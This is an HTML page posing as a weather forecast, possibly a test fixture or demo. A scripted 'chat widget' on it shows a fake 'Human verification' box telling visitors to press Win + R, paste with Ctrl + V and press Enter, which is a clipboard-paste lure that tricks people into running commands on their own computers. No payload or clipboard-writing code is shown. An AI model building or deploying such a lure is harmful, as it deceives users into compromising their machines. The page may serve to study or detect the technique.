<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Weather</title><style>body{font-family:Georgia,serif;margin:0;background:#fff;color:#111}
.top{background:#eee;padding:10px 20px}.wrap{max-width:900px;margin:20px auto;padding:0 20px}
.modal{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.6);z-index:5000}
.card{background:#fff;max-width:480px;margin:80px auto;padding:28px;border-radius:6px}
.hide{position:absolute;left:-10000px;width:2px;height:2px}
pre{background:#f6f6f6;padding:10px}</style></head>
<body>
<div class="top" role="banner"><b>Weather Example</b></div><div class="wrap"><h1>Forecast</h1><p>Sunny, 24°C.</p>
<chat-widget id="w"></chat-widget></div>
<script>customElements.define('chat-widget',class extends HTMLElement{constructor(){super();const r=this.attachShadow({mode:'open'});r.innerHTML='<div id="box" style="border:1px solid #999;padding:12px"><h3>Human verification</h3><p>Press Win + R, press Ctrl + V and press Enter.</p></div>';}});</script>
</body></html>
